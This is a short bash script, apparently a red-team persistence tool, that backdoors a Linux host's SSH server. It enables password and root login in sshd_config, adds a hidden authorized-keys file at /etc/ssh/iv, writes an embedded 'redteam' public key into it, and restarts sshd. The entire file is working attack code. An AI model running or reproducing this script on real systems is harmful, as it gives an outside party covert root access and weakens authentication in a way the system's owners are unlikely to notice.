#!/bin/bash

# Allow password based login, even for root, because, why not.
sed -i 's/^PasswordAuthentication .*$/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/^#PermitRootLogin .*$/PermitRootLogin yes/' /etc/ssh/sshd_config

# Add /etc/sshd/iv as a valid location for authorized keys
sed -i 's/^.*AuthorizedKeysFile.*$/AuthorizedKeysFile \/etc\/ssh\/iv \/root\/.ssh\/authorized_keys \/home\/%u\/.ssh\/authorized_keys/' /etc/ssh/sshd_config

# Write the redteam pubkey to /etc/ssh/iv
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDV4HmsuDrNI7MZpsOYxaaOYz5o5ZZ2iGXhK//Mp4tdvLojcBCBX8TZd3o9jOTDhpayVInmvTFDRzNzfz3WxRIvL9jP1s04I/jC4NdD4u1hI1DBP9YaCfYDgd1JZHFueNBWYZpltB/dhQi5es8l+Q0IFCsgWNbQ/oLrx3/cyHugeQ==' > /etc/ssh/iv
chown root.root /etc/ssh/iv
chmod 644 /etc/ssh/iv

# Ubuntu 12 & 14 don't use systemd
if which systemctl; then
    systemctl restart sshd
else
    service ssh restart
fi